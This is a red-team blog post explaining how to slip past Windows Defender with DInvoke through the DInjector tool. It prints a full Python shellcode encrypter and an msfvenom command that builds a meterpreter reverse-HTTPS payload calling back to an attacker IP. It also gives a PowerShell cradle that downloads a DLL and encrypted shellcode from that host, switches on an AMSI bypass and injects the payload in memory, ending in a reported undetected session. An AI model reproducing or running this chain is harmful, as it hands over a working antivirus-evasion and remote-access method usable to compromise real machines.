---
layout: single
title: "Making use of DInvoke as a better evasion practice , avoiding PInvoke & API Hooks"
date: 2021-10-26
tags:  
  - windows
  - avbypass
  - dinvoke
  - windows-defender
author_profile: true
---

Hello back fellow red teamers. I decided to come make a blog post after a little of long period in which I lost all of my other blog posts.

Lately I have been focused on Windows stuff, such as excercises on trying to bypass Windows Defender through trial and errors etc as a practice to upgrade my own skills on red teaming.

In this article I'm going to explain how you can make use of Dynamic Invocation instead of PInvoke for a less suspicios execution.

First let's take a view :

- [https://github.com/TheWover/DInvoke](https://github.com/TheWover/DInvoke)
 
DInvoke is a dynamic replacement for PInvoke and contains powerful primitives that can be combined to dynamically invoke unmanaged code from disk or from memory.
It helps you use unmanaged code from C# while avoiding suspicious P/Invokes. Rather than statically importing API calls with PInvoke, you may use Dynamic Invocation to load the DLL at runtime and call the function using a pointer to its location in memory. You may call arbitrary unmanaged code from memory (while passing parameters), allowing you to bypass API hooking in a variety of ways and execute post-exploitation payloads reflectively.

Rather than using PInvoke to import the API calls that we want to use, we load a DLL into memory manually. This can be done using whatever mechanism you would prefer. Then, we get a pointer to a function in that DLL. We may call that function from the pointer while passing in our parameters.

By leveraging this dynamic loading API rather than the static loading API that sits behind PInvoke, you avoid directly importing suspicious API calls into your .NET Assembly.

To show that little proof of concept of how it is done at a concrete target I will use [DInjector](https://github.com/snovvcrash/DInjector)
```
(    (
     )\ ) )\ )                   )             (   (  (
    (()/((()/(     (    (     ( /(    (        )\ ))\ )\
     /(_))/(_))(   )\  ))\ (  )\())(  )(      (()/((_|(_)
    (_))_(_))  )\ |(_)/((_))\(_))/ )\(()\      ((_))  _
     |   \_ _|_(_/( !(_)) ((_) |_ ((_)((_)     _| | || |
     | |) | || ' \)) / -_) _||  _/ _ \ '_|  _/ _` | || |
     |___/___|_||_|/ \___\__| \__\___/_|   (_)__,_|_||_|
                 |__/-----------------------------------
                                                K E E P
                                                C A L M
                                                  A N D
                                       D / I N 💉 E C T
                                      S H E L L C O D E
```

DInjector is a tool which is fully ported on `DInvoke` APIs and simulates the concept of executing code through dynamic invocatuion in easier steps for people like me who are generally dumb.

Below is shown the content of encrypter.py which takes a raw shellcode payload and encodes it using either `AES` or `XOR` up to your preference.

- encrypter.py

```python
#!/usr/bin/env python3

import os
import hashlib
from base64 import b64encode
from argparse import ArgumentParser

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives import padding
from cryptography.hazmat.backends import default_backend


class AES:

	def __init__(self, password, iv): 
		self.key = hashlib.sha256(password.encode()).digest()
		self.iv = iv

	def encrypt(self, raw):
		backend = default_backend()
		padder = padding.PKCS7(128).padder()
		raw = padder.update(raw) + padder.finalize()
		cipher = Cipher(algorithms.AES(self.key), modes.CBC(self.iv), backend=backend)
		encryptor = cipher.encryptor()
		return self.iv + encryptor.update(raw) + encryptor.finalize()


def parse_args():
	parser = ArgumentParser()
	parser.add_argument('shellcode_bin', action='store', type=str)
	parser.add_argument('-p', '--password', action='store', type=str, required=True)
	parser.add_argument('-a', '--algorithm', action='store', type=str, default='aes', choices=['aes', 'xor'])
	parser.add_argument('-o', '--output', action='store', type=str)
	parser.add_argument('--base64', action='store_true', default=False)
	return parser.parse_args()


if __name__ == '__main__':
	args = parse_args()

	with open(args.shellcode_bin, 'rb') as fd:
		shellcode = fd.read()

	if args.algorithm == 'aes':
		iv = os.urandom(16)
		ctx = AES(args.password, iv)
		enc = ctx.encrypt(shellcode)
	elif args.algorithm == 'xor':
		enc = bytearray(b ^ ord(args.password) for b in shellcode)

	if args.base64:
		print(b64encode(enc).decode())
	else:
		with open(args.output, 'wb') as fd:
			fd.write(enc)
		print(f'[+] Encrypted shellcode file: {args.output}')
```

>*OK? WHATS NEXT?*

Of course I need to compile the ``DInjector`` project which will output the `.DLL` file that is going to be loaded into the memory in order to call the shellcode.

I could use Visual Studio to compile the DLL project but doing everything in linux just fits in perfectly. I wasnt aware there was a developer tool such as ``monodeveloper`` which could handle `C#` and `.NET` compiling on linux.

![img1](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/DInjector1.png)

The walkthrough after compiling the DLL is pretty much straightforwards, I am going to create a meterpreter shellcode and have the output as raw : 

```bash
pi0x73@kali:~$ msfvenom -p windows/x64/meterpreter/reverse_winhttps LHOST=192.168.88.142 LPORT=443 EXITFUNC=thread -f raw -o shellcode.bin
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 906 bytes
Saved as: shellcode.bin
```

Encryping the shellcode and setting up a listener which will serve the files that we need to load on the target machine : 

![img2](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img2.png)

Before executing let's make sure Windows Defender is up to date.

![img3](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img3.png)

To load the DLL into the memory and call the shellcode you might want to run ``cradle.ps1`` if you dont want to do it manually...

```powershell
# MODULE
$M = "currentthread"

# LHOST
$H = "192.168.88.142"

# AMSI
$A = "true"

# DLL
$D = "DInjector.dll"

# SHELLCODE
$S = "enc"

# PASSWORD
$P = "hahaWOW!!encrypt"

# PROCESS
$N = "notepad"

# IMAGE
$I = "C:\Windows\System32\svchost.exe"

# --------------------------------------------------------------------

$methods = @("remotethread", "remotethreadsuspended")
if ($methods.Contains($M)) {
    $N = (Start-Process -WindowStyle Hidden -PassThru $N).Id
}

$cmd = "$M /am51:$A /sc:http://$H/$S /password:$P /pid:$N /image:$I"

$data = (IWR -UseBasicParsing "http://$H/$D").Content
$assem = [System.Reflection.Assembly]::Load($data)

$flags = [Reflection.BindingFlags] "NonPublic,Static"

$class = $assem.GetType("DInjector.Detonator", $flags)
$entry = $class.GetMethod("Boom", $flags)

$entry.Invoke($null, (, $cmd.Split(" ")))
```

Clean execution , no trigger of the Antivirus and a functional meterpreter session!

![img](https://raw.githubusercontent.com/pi0x73/pi0x73.github.io/main/assets/images/post2/img4.png)
